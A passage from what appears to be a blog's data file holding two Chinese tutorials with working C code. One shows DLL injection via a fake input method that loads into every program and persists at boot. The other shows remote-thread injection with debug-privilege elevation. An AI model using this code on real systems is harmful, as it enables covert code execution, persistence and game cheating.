LoadLibrary(injectDllPaht);//因为现在已经在别的进程中，所以导入后的就成功注入想要的进程了\n\tif (!hMyDll)\n\t{\n\t\tDWORD ERRCODE = GetLastError();\n\t\tMessageBox(0, (LPCSTR)ERRCODE, 0, 0);\n\t}\n\telse\n\t{\n\t\tHMODULE hParentM = GetModuleHandle(0);\n\t\t//FARPROC fRunFunc = GetProcAddress(hMyDll, \"Run\");\n\t\t//fRunFunc();\n\t}\n\n}\n\n\nBOOL WINAPI ImeInquire(LPIMEINFO lpImeInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption)\n{\n\t//初始化ImeInquire\n\t//这个函数是除了DllMain后第一个会被win32 调用的函数. 通过调用这个函数知道你的输入法有什么特性.\n\tlpImeInfo->dwPrivateDataSize = 0;\n\tlpImeInfo->fdwProperty = IME_PROP_KBD_CHAR_FIRST | IME_PROP_UNICODE | IME_PROP_IGNORE_UPKEYS | IME_PROP_SPECIAL_UI;\n\tlpImeInfo->fdwConversionCaps = IME_CMODE_NATIVE | IME_CMODE_NOCONVERSION;\n\tlpImeInfo->fdwSentenceCaps = 0;\n\tlpImeInfo->fdwUICaps = UI_CAP_ROT90;\n\tlpImeInfo->fdwSCSCaps = SCS_CAP_COMPSTR | SCS_CAP_MAKEREAD;\n\tlpImeInfo->fdwSelectCaps = (DWORD)0;\n\tlstrcpy(lpszUIClass, \"CInjWindow\");//注意这里，对ImeInquire赋予我们刚刚创建的类\n\treturn TRUE;\n}\n```\n\n因为输入法需要图标，所以需要添加资源文件，右键dll项目添加\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826175254835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n添加位图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826175356971.png)\n要修改version值如下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826174911782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n\n然后生成就好了\n\n### 真正需要注入的dll\n其实干正事的过程也可以直接放到ime中，但是步方便管理，我这里写出来了\n也是一个dll项目\n\n因为我只是测试，所以就写的很简单，一个验证父进程函数名的就可以了。（游戏辅助代码就可以写在这）\n**dllmain.cpp**如下\n\n```c\n\tcase DLL_PROCESS_ATTACH:\n\t\t//获取当前程序名\n\t\tGetModuleFileName(GetModuleHandle(0),lpFileName,sizeof(lpFileName));\n\t\t//打印出来\n\t\tMessageBox(0,lpFileName, 0, 0);\n}\n\n```\n\n\n\n### 加载ime\n把上面生成的**dll**改名为**ime**结尾，复制到**windows32**目录下\n\n接下来创建一个控制台项目\n\n如下\n```c\n#include \"stdafx.h\"\n#include \"windows.h\"\n#include \"imm.h\"\n#pragma comment(lib,\"imm32.lib\")\n\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n\tif (argc<3)\n\t{\n\t\tMessageBox(0, \"请注意参数 exp：exeName.exe imeName.ime Jerry\", 0, 0);\n\t\treturn 0;\n\t}\n\tLPCSTR infecPath = argv[1];\n\tLPCSTR infecName = argv[2];\n\tPVOID m_retV;\n\t//得到默认的输入法句柄并保存\n\t::SystemParametersInfo(\n\t\tSPI_GETDEFAULTINPUTLANG,\n\t\t0,\n\t\t&m_retV,\n\t\t0);\n\t//安装输入法\n\tHKL m_hImeFile = ImmInstallIME(\n\t\tinfecPath,\n\t\tinfecName);\n\n\tif (ImmIsIME(m_hImeFile))\n\t{\n\t\t//设置为默认输入法\n\t\tSystemParametersInfo(\n\t\t\tSPI_SETDEFAULTINPUTLANG,\n\t\t\t0,\n\t\t\t&m_hImeFile,\n\t\t\tSPIF_SENDWININICHANGE);\n\t\tMessageBox(0, \"安装输入法成功\", 0, 0);\n\t}\n\telse\n\t{\n\t\tMessageBox(0, \"error 安装出错了\", 0, 0);\n\t}\n}\n```\n\n把编译生成的exe文件也拷贝到**windows32**下\n\n安装命令如下    `exeName.exe imeName.ime Jerry`\n\n安装程序可以自由发挥，只要把ime文件安装到系统上就是了\n\n### 最终效果\n当你安装成功后，就会有弹窗提示，你打开任意一个程序，都会有弹窗提示这个程序的路径。这就说明已经注入成功了。\n\n开机后在切换输入法时也会启动\n\n\n","slug":"输入法注入","published":1,"updated":"2019-12-17T02:21:41.532Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c002gccuqmwuaq935","content":"<h2 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h2><p>因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好</p>\n<p>网上大都是一个版本方法，我记录下我自己过程</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>1.编写一个正常的输入法<br>2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数</p>\n<p>因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。</p>\n<p>一个最简ime文件都必须两个函数</p>\n<p>一个<code>dllmain()</code> 还有一个<code>ImeInquire()</code>这两个是必须的</p>\n<h3 id=\"编写输入法主要文件\"><a href=\"#编写输入法主要文件\" class=\"headerlink\" title=\"编写输入法主要文件\"></a>编写输入法主要文件</h3><p>创建一个dll项目,解释都在注释中（注意项目为多字节字符集）<br><code>dllmain.cpp</code></p>\n<pre><code class=\"C\">#include &quot;stdafx.h&quot;\n#include &quot;windows.h&quot;\n#include &quot;imm.h&quot;\n#include &quot;immdev.h&quot;\n#pragma comment(lib,&quot;imm32.lib&quot;)\n\nLPCSTR injectDllPaht = &quot;C://expDll.dll&quot;; //我们最终利用的Dll，写入自己的功能\nvoid injectDLL();//定义函数，下面用\nLRESULT WINAPI UIWndProc(HWND hUIWnd, \n                        UINT message,\n                        WPARAM wParam, \n                        LPARAM lParam) \n{ return 0; }//窗口消息处理函数，可以不要\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n    )//主函数的标准格式\n{\n    HINSTANCE hinstDLL = (HINSTANCE)hModule;//下面需要用这个句柄，格式强转以下\n    switch (ul_reason_for_call)\n    {\n\n    case DLL_PROCESS_ATTACH:\n    {        //定义一个窗口类\n           WNDCLASSEX wc;\n           wc.cbSize = sizeof(WNDCLASSEX);\n           wc.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS | CS_IME;\n           wc.lpfnWndProc = UIWndProc;\n           wc.cbClsExtra = 0;\n           wc.cbWndExtra = 2 * sizeof(LONG);\n           wc.hInstance = hinstDLL;\n           wc.hCursor = LoadCursor(NULL, IDC_ARROW); //IDC_ARROW\n           wc.hIcon = NULL;\n           wc.lpszMenuName = (LPTSTR)NULL;\n           wc.lpszClassName = TEXT(&quot;CInjWindow&quot;);//定义的窗口类的名字\n           wc.hbrBackground = NULL;\n           wc.hIconSm = NULL;\n           if (!RegisterClassEx((LPWNDCLASSEX)&amp;wc))//注册这个窗口，IME必须要注册一个窗口才能安装\n           {\n               break;\n           }\n           injectDLL();//干事的func\n           break;\n    }\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    case DLL_PROCESS_DETACH:\n        UnregisterClass(&quot;CInjWindow&quot;, hinstDLL);//程序退出时注销窗口实例\n        break;\n    }\n    return TRUE;\n}\n\nvoid injectDLL()\n{\n    WCHAR Mes[MAX_PATH];\n    //这里就可以写注入func，我这里就调用一个自己写的测试dll，每次加载的时候都会打印父窗口名称\n    HMODULE hMyDll = LoadLibrary(injectDllPaht);//因为现在已经在别的进程中，所以导入后的就成功注入想要的进程了\n    if (!hMyDll)\n    {\n        DWORD ERRCODE = GetLastError();\n        MessageBox(0, (LPCSTR)ERRCODE, 0, 0);\n    }\n    else\n    {\n        HMODULE hParentM = GetModuleHandle(0);\n        //FARPROC fRunFunc = GetProcAddress(hMyDll, &quot;Run&quot;);\n        //fRunFunc();\n    }\n\n}\n\n\nBOOL WINAPI ImeInquire(LPIMEINFO lpImeInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption)\n{\n    //初始化ImeInquire\n    //这个函数是除了DllMain后第一个会被win32 调用的函数. 通过调用这个函数知道你的输入法有什么特性.\n    lpImeInfo-&gt;dwPrivateDataSize = 0;\n    lpImeInfo-&gt;fdwProperty = IME_PROP_KBD_CHAR_FIRST | IME_PROP_UNICODE | IME_PROP_IGNORE_UPKEYS | IME_PROP_SPECIAL_UI;\n    lpImeInfo-&gt;fdwConversionCaps = IME_CMODE_NATIVE | IME_CMODE_NOCONVERSION;\n    lpImeInfo-&gt;fdwSentenceCaps = 0;\n    lpImeInfo-&gt;fdwUICaps = UI_CAP_ROT90;\n    lpImeInfo-&gt;fdwSCSCaps = SCS_CAP_COMPSTR | SCS_CAP_MAKEREAD;\n    lpImeInfo-&gt;fdwSelectCaps = (DWORD)0;\n    lstrcpy(lpszUIClass, &quot;CInjWindow&quot;);//注意这里，对ImeInquire赋予我们刚刚创建的类\n    return TRUE;\n}</code></pre>\n<p>因为输入法需要图标，所以需要添加资源文件，右键dll项目添加<br><img src=\"https://img-blog.csdnimg.cn/20190826175254835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>添加位图<br><img src=\"https://img-blog.csdnimg.cn/20190826175356971.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>要修改version值如下</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190826174911782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>然后生成就好了</p>\n<h3 id=\"真正需要注入的dll\"><a href=\"#真正需要注入的dll\" class=\"headerlink\" title=\"真正需要注入的dll\"></a>真正需要注入的dll</h3><p>其实干正事的过程也可以直接放到ime中，但是步方便管理，我这里写出来了<br>也是一个dll项目</p>\n<p>因为我只是测试，所以就写的很简单，一个验证父进程函数名的就可以了。（游戏辅助代码就可以写在这）<br><strong>dllmain.cpp</strong>如下</p>\n<pre><code class=\"c\">    case DLL_PROCESS_ATTACH:\n        //获取当前程序名\n        GetModuleFileName(GetModuleHandle(0),lpFileName,sizeof(lpFileName));\n        //打印出来\n        MessageBox(0,lpFileName, 0, 0);\n}\n</code></pre>\n<h3 id=\"加载ime\"><a href=\"#加载ime\" class=\"headerlink\" title=\"加载ime\"></a>加载ime</h3><p>把上面生成的<strong>dll</strong>改名为<strong>ime</strong>结尾，复制到<strong>windows32</strong>目录下</p>\n<p>接下来创建一个控制台项目</p>\n<p>如下</p>\n<pre><code class=\"c\">#include &quot;stdafx.h&quot;\n#include &quot;windows.h&quot;\n#include &quot;imm.h&quot;\n#pragma comment(lib,&quot;imm32.lib&quot;)\n\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    if (argc&lt;3)\n    {\n        MessageBox(0, &quot;请注意参数 exp：exeName.exe imeName.ime Jerry&quot;, 0, 0);\n        return 0;\n    }\n    LPCSTR infecPath = argv[1];\n    LPCSTR infecName = argv[2];\n    PVOID m_retV;\n    //得到默认的输入法句柄并保存\n    ::SystemParametersInfo(\n        SPI_GETDEFAULTINPUTLANG,\n        0,\n        &amp;m_retV,\n        0);\n    //安装输入法\n    HKL m_hImeFile = ImmInstallIME(\n        infecPath,\n        infecName);\n\n    if (ImmIsIME(m_hImeFile))\n    {\n        //设置为默认输入法\n        SystemParametersInfo(\n            SPI_SETDEFAULTINPUTLANG,\n            0,\n            &amp;m_hImeFile,\n            SPIF_SENDWININICHANGE);\n        MessageBox(0, &quot;安装输入法成功&quot;, 0, 0);\n    }\n    else\n    {\n        MessageBox(0, &quot;error 安装出错了&quot;, 0, 0);\n    }\n}</code></pre>\n<p>把编译生成的exe文件也拷贝到<strong>windows32</strong>下</p>\n<p>安装命令如下    <code>exeName.exe imeName.ime Jerry</code></p>\n<p>安装程序可以自由发挥，只要把ime文件安装到系统上就是了</p>\n<h3 id=\"最终效果\"><a href=\"#最终效果\" class=\"headerlink\" title=\"最终效果\"></a>最终效果</h3><p>当你安装成功后，就会有弹窗提示，你打开任意一个程序，都会有弹窗提示这个程序的路径。这就说明已经注入成功了。</p>\n<p>开机后在切换输入法时也会启动</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h2><p>因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好</p>\n<p>网上大都是一个版本方法，我记录下我自己过程</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>1.编写一个正常的输入法<br>2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数</p>\n<p>因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。</p>\n<p>一个最简ime文件都必须两个函数</p>\n<p>一个<code>dllmain()</code> 还有一个<code>ImeInquire()</code>这两个是必须的</p>\n<h3 id=\"编写输入法主要文件\"><a href=\"#编写输入法主要文件\" class=\"headerlink\" title=\"编写输入法主要文件\"></a>编写输入法主要文件</h3><p>创建一个dll项目,解释都在注释中（注意项目为多字节字符集）<br><code>dllmain.cpp</code></p>\n<pre><code class=\"C\">#include &quot;stdafx.h&quot;\n#include &quot;windows.h&quot;\n#include &quot;imm.h&quot;\n#include &quot;immdev.h&quot;\n#pragma comment(lib,&quot;imm32.lib&quot;)\n\nLPCSTR injectDllPaht = &quot;C://expDll.dll&quot;; //我们最终利用的Dll，写入自己的功能\nvoid injectDLL();//定义函数，下面用\nLRESULT WINAPI UIWndProc(HWND hUIWnd, \n                        UINT message,\n                        WPARAM wParam, \n                        LPARAM lParam) \n{ return 0; }//窗口消息处理函数，可以不要\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n    )//主函数的标准格式\n{\n    HINSTANCE hinstDLL = (HINSTANCE)hModule;//下面需要用这个句柄，格式强转以下\n    switch (ul_reason_for_call)\n    {\n\n    case DLL_PROCESS_ATTACH:\n    {        //定义一个窗口类\n           WNDCLASSEX wc;\n           wc.cbSize = sizeof(WNDCLASSEX);\n           wc.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS | CS_IME;\n           wc.lpfnWndProc = UIWndProc;\n           wc.cbClsExtra = 0;\n           wc.cbWndExtra = 2 * sizeof(LONG);\n           wc.hInstance = hinstDLL;\n           wc.hCursor = LoadCursor(NULL, IDC_ARROW); //IDC_ARROW\n           wc.hIcon = NULL;\n           wc.lpszMenuName = (LPTSTR)NULL;\n           wc.lpszClassName = TEXT(&quot;CInjWindow&quot;);//定义的窗口类的名字\n           wc.hbrBackground = NULL;\n           wc.hIconSm = NULL;\n           if (!RegisterClassEx((LPWNDCLASSEX)&amp;wc))//注册这个窗口，IME必须要注册一个窗口才能安装\n           {\n               break;\n           }\n           injectDLL();//干事的func\n           break;\n    }\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    case DLL_PROCESS_DETACH:\n        UnregisterClass(&quot;CInjWindow&quot;, hinstDLL);//程序退出时注销窗口实例\n        break;\n    }\n    return TRUE;\n}\n\nvoid injectDLL()\n{\n    WCHAR Mes[MAX_PATH];\n    //这里就可以写注入func，我这里就调用一个自己写的测试dll，每次加载的时候都会打印父窗口名称\n    HMODULE hMyDll = LoadLibrary(injectDllPaht);//因为现在已经在别的进程中，所以导入后的就成功注入想要的进程了\n    if (!hMyDll)\n    {\n        DWORD ERRCODE = GetLastError();\n        MessageBox(0, (LPCSTR)ERRCODE, 0, 0);\n    }\n    else\n    {\n        HMODULE hParentM = GetModuleHandle(0);\n        //FARPROC fRunFunc = GetProcAddress(hMyDll, &quot;Run&quot;);\n        //fRunFunc();\n    }\n\n}\n\n\nBOOL WINAPI ImeInquire(LPIMEINFO lpImeInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption)\n{\n    //初始化ImeInquire\n    //这个函数是除了DllMain后第一个会被win32 调用的函数. 通过调用这个函数知道你的输入法有什么特性.\n    lpImeInfo-&gt;dwPrivateDataSize = 0;\n    lpImeInfo-&gt;fdwProperty = IME_PROP_KBD_CHAR_FIRST | IME_PROP_UNICODE | IME_PROP_IGNORE_UPKEYS | IME_PROP_SPECIAL_UI;\n    lpImeInfo-&gt;fdwConversionCaps = IME_CMODE_NATIVE | IME_CMODE_NOCONVERSION;\n    lpImeInfo-&gt;fdwSentenceCaps = 0;\n    lpImeInfo-&gt;fdwUICaps = UI_CAP_ROT90;\n    lpImeInfo-&gt;fdwSCSCaps = SCS_CAP_COMPSTR | SCS_CAP_MAKEREAD;\n    lpImeInfo-&gt;fdwSelectCaps = (DWORD)0;\n    lstrcpy(lpszUIClass, &quot;CInjWindow&quot;);//注意这里，对ImeInquire赋予我们刚刚创建的类\n    return TRUE;\n}</code></pre>\n<p>因为输入法需要图标，所以需要添加资源文件，右键dll项目添加<br><img src=\"https://img-blog.csdnimg.cn/20190826175254835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>添加位图<br><img src=\"https://img-blog.csdnimg.cn/20190826175356971.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>要修改version值如下</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190826174911782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>然后生成就好了</p>\n<h3 id=\"真正需要注入的dll\"><a href=\"#真正需要注入的dll\" class=\"headerlink\" title=\"真正需要注入的dll\"></a>真正需要注入的dll</h3><p>其实干正事的过程也可以直接放到ime中，但是步方便管理，我这里写出来了<br>也是一个dll项目</p>\n<p>因为我只是测试，所以就写的很简单，一个验证父进程函数名的就可以了。（游戏辅助代码就可以写在这）<br><strong>dllmain.cpp</strong>如下</p>\n<pre><code class=\"c\">    case DLL_PROCESS_ATTACH:\n        //获取当前程序名\n        GetModuleFileName(GetModuleHandle(0),lpFileName,sizeof(lpFileName));\n        //打印出来\n        MessageBox(0,lpFileName, 0, 0);\n}\n</code></pre>\n<h3 id=\"加载ime\"><a href=\"#加载ime\" class=\"headerlink\" title=\"加载ime\"></a>加载ime</h3><p>把上面生成的<strong>dll</strong>改名为<strong>ime</strong>结尾，复制到<strong>windows32</strong>目录下</p>\n<p>接下来创建一个控制台项目</p>\n<p>如下</p>\n<pre><code class=\"c\">#include &quot;stdafx.h&quot;\n#include &quot;windows.h&quot;\n#include &quot;imm.h&quot;\n#pragma comment(lib,&quot;imm32.lib&quot;)\n\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    if (argc&lt;3)\n    {\n        MessageBox(0, &quot;请注意参数 exp：exeName.exe imeName.ime Jerry&quot;, 0, 0);\n        return 0;\n    }\n    LPCSTR infecPath = argv[1];\n    LPCSTR infecName = argv[2];\n    PVOID m_retV;\n    //得到默认的输入法句柄并保存\n    ::SystemParametersInfo(\n        SPI_GETDEFAULTINPUTLANG,\n        0,\n        &amp;m_retV,\n        0);\n    //安装输入法\n    HKL m_hImeFile = ImmInstallIME(\n        infecPath,\n        infecName);\n\n    if (ImmIsIME(m_hImeFile))\n    {\n        //设置为默认输入法\n        SystemParametersInfo(\n            SPI_SETDEFAULTINPUTLANG,\n            0,\n            &amp;m_hImeFile,\n            SPIF_SENDWININICHANGE);\n        MessageBox(0, &quot;安装输入法成功&quot;, 0, 0);\n    }\n    else\n    {\n        MessageBox(0, &quot;error 安装出错了&quot;, 0, 0);\n    }\n}</code></pre>\n<p>把编译生成的exe文件也拷贝到<strong>windows32</strong>下</p>\n<p>安装命令如下    <code>exeName.exe imeName.ime Jerry</code></p>\n<p>安装程序可以自由发挥，只要把ime文件安装到系统上就是了</p>\n<h3 id=\"最终效果\"><a href=\"#最终效果\" class=\"headerlink\" title=\"最终效果\"></a>最终效果</h3><p>当你安装成功后，就会有弹窗提示，你打开任意一个程序，都会有弹窗提示这个程序的路径。这就说明已经注入成功了。</p>\n<p>开机后在切换输入法时也会启动</p>\n"},{"title":"远线程注入","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102203.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102203.png","date":"2019-08-26T02:11:22.000Z","_content":"\n\n### 什么是远线程注入\n在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。\n\n### 代码\n下面例子是根据查询一打开窗口中的计算器进程，然后\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826100826723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n注释都很详细 \n```c\n#include \"windows.h\"\n#include \"Tlhelp32.h\"\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName);\nint EnablePrivilege(bool isStart);\nDWORD GetProcessId(PTCHAR pszProcessName);\n\nvoid main()\n{\n\tDWORD ProcessId = GetProcessId(\"calc.exe\");\\\\目标程序\n\tInjectDll(ProcessId ,\"C:\\\\Users\\\\sam\\\\Desktop\\\\A.dll\");\\\\注入dll的地址\n}\n\n\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName)\n{\n\tif (szDllName[0] == NULL)\n\t\treturn -1;\n\t//提高权限相关操作\n\tEnablePrivilege(TRUE);\n\t//1. 打开进程\n\tHANDLE hProcess = OpenProcess(  PROCESS_ALL_ACCESS,   //打开进程权限\n\t\tFALSE,                                              //是否可继承 \n\t\tdwProcessId);                                       //进程ID\n\n\tif (hProcess == INVALID_HANDLE_VALUE)\n\t\treturn -1;\n\n\t//2. 在远程进程中申请空间\n\tLPVOID pszDllName = VirtualAllocEx(hProcess, //远程进程句柄\n\t\tNULL,                                  //建议开始地址\n\t\t4096,                                  //分配空间大小\n\t\tMEM_COMMIT,                            //空间初始化全0\n\t\tPAGE_EXECUTE_READWRITE);               //空间权限\n\n\tif (NULL == pszDllName)\n\t{\n\t\treturn -1;\n\t}\n\n\t//3. 向远程进程中写入数据\n\tBOOL bRet = WriteProcessMemory( hProcess, pszDllName, \n\t\tszDllName, MAX_PATH, NULL);\n\n\tif (NULL == bRet)\n\t{\n\t\treturn -1;\n\t}\n\n\t//4. 在远程进程中创建远程线程\n\tHANDLE m_hInjecthread = CreateRemoteThread(hProcess,      //远程进程句柄\n\tNULL,                                            //安全属性\n\t0,                                               //栈大小\n\t(LPTHREAD_START_ROUTINE)LoadLibrary,             //进程处理函数    \n\tpszDllName,                                      //传入参数\n\tNULL,                                            //默认创建后的状态\n\tNULL);                                           //线程ID\n\n\tif (NULL == m_hInjecthread)\n\t{\n\t\tDWORD dwErr = GetLastError();\n\t\treturn -1;\n\t}\n\n\t//5. 等待线程结束返回\n\tDWORD dw = WaitForSingleObject(m_hInjecthread, -1);\n\t//6. 获取线程退出码,即LoadLibrary的返回值，即dll的首地址\n\tDWORD dwExitCode;\n\tGetExitCodeThread(m_hInjecthread, &dwExitCode);\n\tHMODULE m_hMod = (HMODULE)dwExitCode;\n\n\t//7. 释放空间\n\tBOOL bReturn = VirtualFreeEx(hProcess, pszDllName, \n\t\t4096, MEM_DECOMMIT);\n\n\tif (NULL == bReturn)\n\t{\n\t\treturn -1;\n\t}\n\n\tCloseHandle(hProcess);\n\thProcess = NULL;\n\t//恢复权限相关操作\n\tEnablePrivilege(FALSE);\n\n\treturn 0;\n}\nint EnablePrivilege(bool isStart)\n{        \n\t//1. 得到令牌句柄\n\tHANDLE  hToken = NULL;      //令牌句柄  \n\tif (!OpenProcessToken( GetCurrentProcess(), \n\t\tTOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_READ, \n\t\t&hToken))\n\t{   \n\t\treturn FALSE;\n\t}\n\n\t//2. 得到特权值\n\tLUID    luid = {0};         //特权值\n\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))\n\t{\n\t\treturn FALSE;\n\t}\n\t//3. 提升令牌句柄权限\n\tTOKEN_PRIVILEGES tp = {0};  //令牌新权限\n\ttp.PrivilegeCount = 1; \n\ttp.Privileges[0].Luid = luid;\n\ttp.Privileges[0].Attributes = isStart ? SE_PRIVILEGE_ENABLED : 0;\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL))\n\t{\n\t\treturn FALSE;\n\t}\n\t//4. 关闭令牌句柄\n\tCloseHandle(hToken);\n\treturn 0;\n}\nDWORD GetProcessId(PTCHAR pszProcessName)\n{\n\tHANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取当前系统的快照，这种方法能拿到想要的进程ID\n\n\tif (INVALID_HANDLE_VALUE == hProcess)\n\t{\n\t\treturn 0;\n\t}\n\n\tDWORD dwProcessId = 0;\n\n\tPROCESSENTRY32 process32 = {0};\n\tprocess32.dwSize = sizeof(PROCESSENTRY32);\n\n\tBOOL bRetProcess = FALSE;\n\tbRetProcess = Process32First(hProcess, &process32);\n\n\tdo\n\t{\n\t\tif (strcmp(pszProcessName, process32.szExeFile) == 0)//名称对上，获取其进程ID\n\t\t{\n\t\t\tdwProcessId = process32.th32ProcessID;\n\t\t\tbreak;\n\t\t}\n\n\t\tbRetProcess = Process32Next(hProcess, &process32);\n\t}while (bRetProcess);\n\tCloseHandle(hProcess);\n\n\treturn dwProcessId;\n}\n\n\n```\n","source":"_posts/远线程注入.md","raw":"---\ntitle: 远线程注入\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102203.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102203.png\ndate: 2019-08-26 10:11:22\ntags:\n    - 注入\ncategories: 逆向\n---\n\n\n### 什么是远线程注入\n在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。\n\n### 代码\n下面例子是根据查询一打开窗口中的计算器进程，然后\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826100826723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n注释都很详细 \n```c\n#include \"windows.h\"\n#include \"Tlhelp32.h\"\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName);\nint EnablePrivilege(bool isStart);\nDWORD GetProcessId(PTCHAR pszProcessName);\n\nvoid main()\n{\n\tDWORD ProcessId = GetProcessId(\"calc.exe\");\\\\目标程序\n\tInjectDll(ProcessId ,\"C:\\\\Users\\\\sam\\\\Desktop\\\\A.dll\");\\\\注入dll的地址\n}\n\n\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName)\n{\n\tif (szDllName[0] == NULL)\n\t\treturn -1;\n\t//提高权限相关操作\n\tEnablePrivilege(TRUE);\n\t//1. 打开进程\n\tHANDLE hProcess = OpenProcess(  PROCESS_ALL_ACCESS,   //打开进程权限\n\t\tFALSE,                                              //是否可继承 \n\t\tdwProcessId);                                       //进程ID\n\n\tif (hProcess == INVALID_HANDLE_VALUE)\n\t\treturn -1;\n\n\t//2. 在远程进程中申请空间\n\tLPVOID pszDllName = VirtualAllocEx(hProcess, //远程进程句柄\n\t\tNULL,                                  //建议开始地址\n\t\t4096,                                  //分配空间大小\n\t\tMEM_COMMIT,                            //空间初始化全0\n\t\tPAGE_EXECUTE_READWRITE);               //空间权限\n\n\tif (NULL == pszDllName)\n\t{\n\t\treturn -1;\n\t}\n\n\t//3. 向远程进程中写入数据\n\tBOOL bRet = WriteProcessMemory( hProcess, pszDllName, \n\t\tszDllName, MAX_PATH, NULL);\n\n\tif (NULL == bRet)\n\t{\n\t\treturn -1;\n\t}\n\n\t//4. 在远程进程中创建远程线程\n\tHANDLE m_hInjecthread = CreateRemoteThread(hProcess,      //远程进程句柄\n\tNULL,                                            //安全属性\n\t0,                                               //栈大小\n\t(LPTHREAD_START_ROUTINE)LoadLibrary,             //进程处理函数    \n\tpszDllName,                                      //传入参数\n\tNULL,                                            //默认创建后的状态\n\tNULL);                                           //线程ID\n\n\tif (NULL == m_hInjecthread)\n\t{\n\t\tDWORD dwErr = GetLastError();\n\t\treturn -1;\n\t}\n\n\t//5. 等待线程结束返回\n\tDWORD dw = WaitForSingleObject(m_hInjecthread, -1);\n\t//6. 获取线程退出码,即LoadLibrary的返回值，即dll的首地址\n\tDWORD 